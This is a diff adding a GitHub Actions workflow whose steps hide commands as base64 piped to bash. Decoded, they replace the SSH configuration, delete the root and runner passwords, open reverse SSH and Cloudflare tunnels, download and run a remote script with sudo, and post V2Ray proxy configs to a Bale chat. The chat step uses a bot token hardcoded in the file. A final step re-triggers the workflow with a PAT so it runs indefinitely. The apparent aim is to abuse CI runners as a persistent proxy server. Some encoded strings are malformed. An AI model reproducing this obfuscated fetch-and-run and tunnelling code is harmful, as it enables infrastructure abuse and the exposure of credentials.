@@ -1,0 +1,80 @@
+name: Linux3ui-auto
+on: [push, workflow_dispatch]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    env:
+      TUNNEL_URL: ""
+      Config_URL: ""
+      SSH_URL: ""
+      USERNAME: ""
+      PASSWORD: ""
+      WEBBASEPATH: ""
+      MyConfig1: ""
+      MyConfig2: ""
+    steps:
+      - name: Set And Create EVN
+        run: |
+          echo "VFVOTkVMX1VSTD0iIgpDb25maWdfVVJMPTwiIgpTU0hfVVJMPTwiIgpVU0VSTkFNRT0iIgpQQVNTV09SRD0iIldFQkJBU0VQVEg9IiIKZWNobyAiJFRVTk5FTF9VUkwiID4gdHVubmVsX3VybC50eHQKZWNobyAiJENvbmZpZ19VUkwiID4gY29uZmlnX3VybC50eHQKZWNobyAiJFVTRVJOQU1FIiA+IHVzZXJuYW1lX3VybC50eHQKZWNobyAiJFBBU1NXT1JEIiA+IHBhc3NfdXJsLnR4dAp" | base64 -d | bash
+
+      - name: Update and install packages
+        run: |
+          echo "c3VkbyBhcHQtZ2V0IHVwZGF0ZSAtcXEKc3VkbyBhcHQtZ2V0IGluc3RhbGwgLXkgbmVvZmV0Y2ggc3BlZWR0ZXN0LWNsaSBwaHAtY2xpIGN1cmw=" | base64 -d | bash
+
+      - name: Download sshd_config
+        run: |
+          echo "d2dldCBodHRwczovL3Jhdy5naXRodWJ1c3VyY29udGVudC5jb20vR29nb1ppbi9zc2hkL21haW4vc3NoZF9jb25maWcgLU8gc3NoZF9jb25maWc=" | base64 -d | bash
+
+      - name: Replace sshd_config
+        run: |
+          echo "c3VkbyBjcCBzc2hkX2NvbmZpZyAvZXRjL3NzaC9zc2hkX2NvbmZpZw==" | base64 -d | bash
+
+      - name: Restart SSH service
+        run: |
+          echo "c3VkbyBzZXJ2aWNlIHNzaCByZXN0YXJ0" | base64 -d | bash
+
+      - name: Remove root password
+        run: |
+          echo "c3VkbyBwYXNzd2QgLWQgcm9vdA==" | base64 -d | bash
+
+      - name: Remove runner password
+        run: |
+          echo "c3VkbyBwYXNzd2QgLWQgcnVubmVy" | base64 -d | bash
+
+      - name: Start Panel Tunnel
+        run: |
+          echo "c3VkbyBiYXNoIC1jICdubyh1cCBzc2ggLXAgNDQzIC1vIFN0cmljdEhvc3RLZXlDaGVja2luZz1ubyAtbyBTZXJ2ZXJBbGl2ZUludGVydmFsPTMwIC1SMDoxMjcuMC4wLjE6MjIgdGNwQGFwLmZyZWUucGluZ2d5LmlvID4gc3NodHVubmVsLmxvZyAyPiYxICYnCmZvciBpIGluIHsxLi4xOH07IGRvCmVjaG8gIkZvdW5kIFNTSCBUdW5uZWwgLSBUcmF5ICRpIC4uLiIKU1NIX1VSTD0kKGdyZXAgLW9FICd0Y3A6Ly9bXjpzcGFjZV0rJyBzc2h0dW5uZWwubG9nIHwgdGFpbCAtbiAxIHwgc2VkICdzfF50Y3A6Ly98JykKaWYgWyAtbiAiJFNTSF9VUkwiIF07IHRoZW4KZWNobyAi4piGIFBhbmVsIFNTSCBDcmVhdGVkISIKZWNobyAiU1NIVHVubmVsIEFkZHJlc3M6ICRTU0hfVVJMIgplY2hvICIkU1NIX1VSTCIgPiBzc2hfdXJsLnR4dA==" | base64 -d | bash
+
+      - name: Start Install Panel 3ui
+        run: |
+          echo "Y3VybCAtTHMgaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL21hdHRoaWFzb3N0ZXJoYWdlbjE1MzAvdGg1a2VUcnZGdXQ3eTJTWVdYZC9yZWZzL2hlYWRzL21haW4vYXV0by1pbnN0M3h1aS5zaCAtbyBzY3JpcHQuc2gKbm9odXAgc3VkbyBiYXNoIHNjcmlwdC5zaCAyPiYxIHwgdGVlIC1hIHgtdWktaW5zdGFsbC5sb2cgJgo=" | base64 -d | bash
+
+      - name: Start Panel Tunnel (Cloudflare)
+        run: |
+          echo "d2dldCBodHRwczovL2dpdGh1Yi5jb20vY2xvdWRmbGFyZS9jbG91ZGZsYXJlZC9yZWxlYXNlcy9sYXRlc3QvZG93bmxvYWQvY2xvdWRmbGFyZWQtbGludXgtYW1kNjQgLU8gcGFuZWx0dW5uZWwtcnVubmVyCmNwIHBhbmVsdHVubmVsLXJ1bm5lciBjb25maWd0dW5uZWwtcnVubmVyCnN1ZG8gY2htb2QgK3ggcGFuZWx0dW5uZWwtcnVubmVyCnN1ZG8gY2htb2QgK3ggY29uZmlndHVubmVsLXJ1bm5lcgpub2h1cCAuL3BhbmVsdHVubmVsLXJ1bm5lciB0dW5uZWwgLS11cmwgaHR0cDovL2xvY2FsaG9zdDoyMDUzIC0tbm8tdGxzLXZlcmlmeSAtLW5vLWF1dG91cGRhdGUgLS1lZGdlLWlwLXZlcnNpb24gYXV0byAtLXByb3RvY29sIGh0dHAyID4gcGFuZWx0dW5uZWwubG9nIDI+JjEgJgo=" | base64 -d | bash
+
+      - name: Start Config Tunnel
+        run: |
+          echo "bm9odXAgLi9jb25maWd0dW5uZWwtcnVubmVyIHR1bm5lbCAtLXVybCBodHRwOi8vbG9jYWxob3N0OjEyODAgLS1uby1hdXRvdXBkYXRlIC0tZWRnZS1pcC12ZXJzaW9uIGF1dG8gLS1wcm90b2NvbCBodHRwMiA+IGNvbmZpZ3R1bm5lbC5sb2cgMj4mMSAmCg==" | base64 -d | bash
+
+      - name: Show Info
+        run: |
+          echo "TURORUxfVVJMPWMoYXQgIHR1bm5lbF91cmwudHh0KQpDb25maWdfVVJMPWMoYXQgIGNvbmZpZ191cmwudHh0KQpTU0hfVVJMPWMoYXQgIHNzaF91cmwudHh0KQpVU0VSTkFNRT1jYXQgIHVzZXJuYW1lX3VybC50eHQKUEFTU1dPUkQ9Y2F0ICBwYXNzX3VybC50eHQKV0VCQkFTRVBBVEg9Ii9aYTB6dHY3WTNDSkRIVDVRcXAiCk15Q29uZmlnMT0idmxlc3M6Ly80MmQzNGZlYy0zYWFkLTQ4NDctOGMyOS1iMGYwZDhlMWRjYmZAJENvbmZpZ19VUkM6NDQzP2VuY3J5cHRpb249bm9uZSZzZWN1cml0eT10bHMmc25pPSRDb25maWdfVVJMJmFsbG93SW5zZWN1cmU9dHJ1ZSZhbHBuPWh0dHAvMS4xJmZwPWNocm9tZSZ0eXBlPXdzJmhvc3Q9JENvbmZpZ19VUkwmcGF0aD0vYTNPcHRLVE5LSTZJQ1lpUkN0NSZwYWNrZXRFbmNvZGluZz14dWRwI0XimKYg4q2Q77iP TWFzdGVyVmlwIgpNeUNvbmZpZzI9InZsZXNzOi8vNDJkMzRmZWMtM2FhZC00ODQ3LThjMjktYjBmMGQ4ZTFkY2JmQHd3dy5zcGVlZHRlc3QubmV0OjQ0Mz9lbmNyeXB0aW9uPW5vbmUmc2VjdXJpdHk9dGxzJnNuaT0kQ29uZmlnX1VSTCZhbGxvd0luc2VjdXJlPXRydWUmYWxwbj1odHRwLzEuMSZmcD1jaHJvbWUmdHlwZT13cyZob3N0PSRDb25maWdfVVJMKHBhdGg9L2EzT3B0S1ROS0k2SUNZaVJDdDUmcGFja2V0RW5jb2Rpbmc9eHVkcCNimKYg4q2Q77iPTWFzdGVyVmlwIgo=" | base64 -d | bash
+
+      - name: Send message to Bale Group
+        env:
+          TOKEN: "1076637420:eGO9F9RO7kM27YetwEGIFyR316Bj0dERp9A"
+          CHAT_ID: 5812315610
+          USER_NAME: "Morteza_V2Ray Config"
+        run: |
+          echo "TXlDb25maWcxPSQoY2F0IG15Y29uZmlnMV91cmwudHh0KQpNeUNvbmZpZzI9JChjYXQgbXljb25maWcyX3VybC50eHQpCgpDVVJSRU5UX1RJTUU9JChkYXRlICslWS8lbS8lZCUgJUg6JU06JVMpKQoKY3VybCAtWCBQT1NUICJodHRwczovL3RhcGkuYmFsZS5haS8ke1RPS0VO}/sendMessage\" -H \"Content-Type: application/json\" -d '{\"chat_id\": \"'\"${CHAT_ID}\"'\", \"text\": \"'\"${USER_NAME}\"'\\n\\n'\"${MyConfig1}\"'\\n\\n'\"${MyConfig2}\"'\\n\\n🕒 '\"${CURRENT_TIME}\"'\"}'" | base64 -d | bash
+
+      - name: Delay and Self-Restart (5 hours 25 minutes)
+        env:
+          PAT: ${{ secrets.PAT_WORKFLOW }}
+          REPO: ${{ github.repository }}
+        run: |
+          echo "ZWNobyAi8J+UvCBTdGFydGluZyBkZWxheSB0aW1lcjogNSBob3VycyBhbmQgMjUgbWludXRlcy4uLiIKZWNobyAiIEN1cnJlbnQgdGltZTogJChkYXRlKSIKc2xlZXAgMTk1MDAKZWNobyAi8J+agCBUcmlnZ2VyaW5nIHdvcmtmbG93IHJlc3RhcnQuLi4iCmN1cmwgLVggUE9TVCAgXAogIC1IICJBY2NlcHQ6IGFwcGxpY2F0aW9uL3ZuZC5naXRodWIudjMrandrIiBcCiAgLUggIkF1dGhvcml6YXRpb246IHRva2VuICRQQVQiIFwKICBodHRwczovL2FwaS5naXRodWIuY29tL3JlcG9zLyRSRVBPL2FjdGlvbnMvd29ya2Zsb3dzL015U2VydmVyTDEueW1sL2Rpc3BhdGNoZXMgXAogIC1kICd7InJlZiI6Im1haW4ifScKZWNobyAi8J+agSBSZXN0YXJ0IGNvbW1hbmQgc2VudCBzdWNjZXNzZnVsbHkgYXQgJChkYXRlKSI=" | base64 -d | bash
+
+      - name: Keep alive
+        run: tail -f /dev/null
